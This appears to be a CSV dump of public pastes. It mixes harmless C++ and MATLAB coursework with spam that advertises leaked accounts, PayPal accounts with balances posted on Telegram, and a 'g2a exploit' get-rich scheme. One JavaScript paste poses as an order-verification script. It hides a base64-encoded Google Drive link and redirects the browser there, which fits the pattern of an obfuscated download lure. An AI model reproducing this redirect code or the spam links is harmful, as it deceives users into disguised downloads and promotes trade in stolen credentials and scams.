id,title,username,language,date,content
YfY09M0k,Products.js,leighton,JavaScript,Wednesday 7th of May 2025 01:06:22 PM CDT,849325 - check it out at http://tinyurl.com/new2025may
f7Y6QaP8,PayPal with Balance,Xp_Isolation,JavaScript,Wednesday 7th of May 2025 01:06:06 PM CDT,18611 Accounts Posted On https://t.me/leakzbyeminem
M8K504Jd,Make $1000 15-MINUTES  (BEGINNER) 6D,kosson,JavaScript,Wednesday 7th of May 2025 01:06:06 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

pKGWLrUyRq
"
iHxyizW8,Leaked Accounts - Fresh HitsUntitled,lefiel82,PHP,Wednesday 7th of May 2025 01:04:11 PM CDT,188061 - check it out at https://tinyurl.com/nulledbb
TMWwP1tt,Untitled,Josif_tepe,C++,Wednesday 7th of May 2025 01:03:48 PM CDT,"#include <iostream>

using namespace std;

class Point {
private:
    int x, y;
public:
    Point() {}
    Point(int _x, int _y) {
        x = _x;
        y = _y;
    }
    Point operator + (Point tmp) {
        return Point(x + tmp.x, y + tmp.y);
    }
    Point operator - (Point tmp) {
        return Point(x - tmp.x, y - tmp.y);
    }
    Point operator * (Point tmp) {
        return Point(x * tmp.x, y * tmp.y);
    }
    Point operator / (Point tmp) {
        return Point(x / tmp.x, y / tmp.y);
    }
    
    bool operator < (Point tmp) {
        if(x < tmp.x and y < tmp.y) {
            return true;
        }
        else {
            return false;
        }
    }
    
    bool operator <= (Point tmp) {
        if(x <= tmp.x and y <= tmp.y) {
            return true;
        }
        else {
            return false;
        }
    }
    bool operator > (Point tmp) {
        if(x > tmp.x and y > tmp.y) {
            return true;
        }
        else {
            return false;
        }
    }
    bool operator >= (Point tmp) {
        if(x >= tmp.x and y >= tmp.y) {
            return true;
        }
        else {
            return false;
        }
    }
    
    bool operator == (Point tmp) {
        if(x == tmp.x and y == tmp.y) {
            return true;
        }
        else {
            return false;
        }
    }
    
    bool operator != (Point tmp) {
        if(x != tmp.x or y != tmp.y) {
            return true;
        }
        else {
            return false;
        }
    }
    void pechati() {
        cout << x << "" "" << y << endl;
    }
};
int main()
{
    Point a(3, 4);
    Point b(5, 6);
    
    if(a < b) {
        cout << ""POMALO"" << endl;
    }
    
    
    
    
    return 0;
}
"
g8wqzjx1,Untitled,Epiphemeral,JavaScript,Wednesday 7th of May 2025 01:03:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24311/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5ckYcHAX,EARN $900 INSTANTLY 2025 EI,kosson,JavaScript,Wednesday 7th of May 2025 12:59:23 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

rEGJBi2VdG
"
pQR3tJqv,Untitled,Josif_tepe,C++,Wednesday 7th of May 2025 12:59:16 PM CDT,"#include <iostream>

using namespace std;

class Point {
private:
    int x, y;
public:
    Point() {}
    Point(int _x, int _y) {
        x = _x;
        y = _y;
    }
    Point operator + (Point tmp) {
        return Point(x + tmp.x, y + tmp.y);
    }
    Point operator - (Point tmp) {
        return Point(x - tmp.x, y - tmp.y);
    }
    Point operator * (Point tmp) {
        return Point(x * tmp.x, y * tmp.y);
    }
    Point operator / (Point tmp) {
        return Point(x / tmp.x, y / tmp.y);
    }
    void pechati() {
        cout << x << "" "" << y << endl;
    }
};
int main()
{
    Point a(3, 4);
    Point b(5, 6);
    
    Point c = a + b;
    c.pechati();
    
    Point c2 = a - b;
    c2.pechati();
    
    Point c3 = a * b;
    c3.pechati();
    
    Point c4 = a / b;
    c4.pechati();
    
    
    
    
    return 0;
}
"
Bf6Qr92r,Leaked Accounts - Fresh HitsUntitled,HamdanIsAwesome,JavaScript,Wednesday 7th of May 2025 12:56:18 PM CDT,006751 - check it out at http://tinyurl.com/new2025may
GB6G4i8x,Untitled,MOOOSE21,MatLab,Wednesday 7th of May 2025 12:55:36 PM CDT,"C= [11, 13, 17, 14; 16, 18, 14, 10; 21, 24, 13, 10];
S= [8 5 9];
D= [8 7 5 4];
[m ,n]= size(C);

if(sum(S)==sum(D))
    disp('Balanced');
else if(sum(S)<sum(D))
        C(end+1,:)=zeros(1,n);
        S(end+1)= sum(D)- sum(S);
        s=sum(D);

else 
     C(:,end+1)=zeros(m,1);
     D(end+1)= sum(S)- sum(D);
     s=sum(C);
end
end
table =C;
table= [table , S(:)];
mD = [D, s];  
table= [table ; mD];
var ={'D1','D2','D3', 'D4', 'Supply' };
disp(array2table(table, 'VariableNames', var));
X=C;
Ci=C;
while any(S~=0)|| any(D~=0)
    mini = min(C(:));
    [r, c]= find(C==mini);
    y = min(S(r), D(c));
    [alloc, ind]= max(y);
    rr= r(ind);
    cc= c(ind);
    X(rr, cc)= alloc;
    S(rr)= S(rr)- alloc;
    D(cc)= D(cc)-alloc;
    C(rr, cc)= inf;


end
table =X;
table= [table , S(:)];
mD = [D, s];  
table= [table ; mD];
var ={'D1','D2','D3', 'D4', 'Supply' };
disp(array2table(table, 'VariableNames', var));

Cost = Ci.*X;
[m, n]= size(X);
if nnz(X)==m+n-1
    disp('Non-degenerate initial BFS');
else 
    disp('degenerate initial BFS');
end
final = sum(Cost(:));
disp(""Total Cost is "");
disp(final);
//
C = [-3 2 0 0]; 
A = [1 1 1 0; 2 -1 0 1]; 
b = [6; 9]; 
m=size(A,1);
n=size(A,2);
bv_index=n-m+1:n;
Y=[A,b];
xb=Y(:,end);
cb=C(bv_index);
zicj= cb*Y(:,1:n)-C;
z=cb*xb;
table=[zicj,z;Y];
disp(table)
while any(zicj<0)
    [~,ev]=min(zicj);
    if all(Y(:,ev)<=0)
        disp(""unbounded"")
        return;
    end
    ratio=inf(1,m);
    for j=1:m
        if (Y(j,ev)>0)
            ratio(j)=xb(j)/Y(j,ev);
        end
    end
    [~,lv]=min(ratio);
    bv_index(lv)=ev;
    pivot=Y(lv,ev);
    Y(lv,:)=Y(lv,:)/pivot;
    for i=1:m
        if i~=lv
            Y(i,:)=Y(i,:)-Y(i,ev)*Y(lv,:);
        end
    end
    xb=Y(:,end);
    cb=C(bv_index);
    zicj=cb*Y(:,1:n)-C;
    z=cb*xb
    table=[zicj,z;Y];
    disp(table)
end
\\ 
clc;
clear;

% Objective function (Maximize Z = -3x + 2y)
C = [-3 2 0 0 -1e5 -1e5];   % Add Big M penalties (negative for maximization)

% Constraints (converted for simplex):
% x + y - s1 + a1 = 6
% 2x - y - s2 + a2 = 9

A = [1  1 -1  0 1 0; 
     2 -1  0 -1 0 1];
b = [6; 9];

[m, n] = size(A);

% Initial basic variables (artificial variables are basic initially)
bv_index = [5 6];

% Form initial tableau
Y = [A b];

% Initial values
xb = Y(:, end);
cb = C(bv_index);

% Compute initial Zj - Cj
zicj = cb * Y(:, 1:n) - C;
z = cb * xb;
table = [zicj z; Y];
disp('Initial Tableau:');
disp(table);

% Simplex loop
while any(zicj < 0)
    [~, ev] = min(zicj);  % Entering variable

    if all(Y(:, ev) <= 0)
        disp(""Unbounded solution"");
        return;
    end

    ratio = inf(m, 1);
    for j = 1:m
        if Y(j, ev) > 0
            ratio(j) = xb(j) / Y(j, ev);
        end
    end

    [~, lv] = min(ratio); % Leaving variable
    bv_index(lv) = ev;

    % Pivot operation
    pivot = Y(lv, ev);
    Y(lv, :) = Y(lv, :) / pivot;

    for i = 1:m
        if i ~= lv
            Y(i, :) = Y(i, :) - Y(i, ev) * Y(lv, :);
        end
    end

    % Update tableau
    xb = Y(:, end);
    cb = C(bv_index);
    zicj = cb * Y(:, 1:n) - C;
    z = cb * xb;

    table = [zicj z; Y];
    disp('Next Tableau:');
    disp(table);
end

% Final Result (no sign change needed for maximization)
fprintf('\nOptimal value (Max Z): %.2f\n', z);
for i = 1:n
    val = 0;
    if any(bv_index == i)
        row = find(bv_index == i);
        val = Y(row, end);
    end
    fprintf('Variable x%d = %.2f\n', i, val);
end
//
C = [-2 -1 0 0 0];
A = [-3 -1 1 0 0;
     -4 -3 0 1 0;
     -1 -2 0 0 1];
b = [-3; -6; -3];

[m, n] = size(A);
bv_index = n - m + 1:n;

Y = [A b];
xb = Y(:, end);
cb = C(bv_index);

while true
    zicj = cb * Y(:, 1:n) - C;
    z = cb * xb;
    table = [zicj, z; Y];
    disp(""initial table"")
disp(table);

    if all(xb >= 0)
        disp('Feasible Solution')
        basic_var = bv_index;
        xb
        disp('Optimal Solution')
        z
        break
    else
        [~, lv] = min(xb);
        if all(Y(lv, 1:n) >= 0)
            disp('No feasible Solution');
            break;
        else
            ratio = inf(1, n);
            for j = 1:n
                if Y(lv, j) < 0
                    ratio(j) = abs(zicj(j) / Y(lv, j));
                end
            end
            [~, ev] = min(ratio);
            bv_index(lv) = ev;
            pivot = Y(lv, ev);
            Y(lv, :) = Y(lv, :) / pivot;
            for i = 1:m
                if i ~= lv
                    Y(i, :) = Y(i, :) - Y(i, ev) * Y(lv, :);
                end
            end
            xb = Y(:, end);
            cb = C(bv_index);
       
        end
    end
end
     disp(table);
//
clear all;
clc;
f= @(x1, x2)x1^2 -x1*x2 + x2^2;
grad= @(x1, x2)[2*x1- x2, 2*x2- x1];
x0=[1 , 0.5];
tol= 10^-5;
l= 0.01;
t= 100;
i=0; 
x1=[0, 0];
while norm(t)>tol
    g= -1* grad(x0(1), x0(2));
    x1=  x0  + l*g;
    t= x1-x0;
    x0=x1;
    i= i+1;
    
end
M= f(x0(1), x0(2));
disp('point is');
disp(x0);
disp(""minimum value at optimal point is :"");
fprintf('%0.6f',M);
disp('no. of iteration are ');
disp(i);
//

        "
